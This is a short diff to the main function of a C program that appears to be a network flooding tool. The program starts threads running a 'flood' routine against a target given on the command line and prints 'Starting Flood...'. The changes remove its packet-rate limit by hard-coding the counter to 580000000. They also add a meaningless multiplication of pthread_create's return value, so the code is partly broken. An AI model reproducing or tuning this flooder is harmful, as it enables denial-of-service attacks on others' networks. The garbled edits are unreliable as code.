@@ -188,13 +188,13 @@ int main(int argc, char *argv[ ])
 
 	int i;
 	for(i = 0;i<num_threads;i++){
-		pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
+		pthread_create( &thread[i], NULL, &flood, (void *)argv[1]) * 4096;
 	}
 	fprintf(stdout, "Starting Flood...\n");
 	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
 	{
 		usleep((1000/multiplier)*1000);
-		if((pps*multiplier) > maxpps)
+		if((580000000*multiplier) > maxpps)
 		{
 			if(1 > limiter)
 			{
@@ -211,7 +211,7 @@ int main(int argc, char *argv[ ])
 				sleeptime = 0;
 			}
 		}
-		pps = 0;
+		pps = 580000000;
 	}
 
 	return 0;
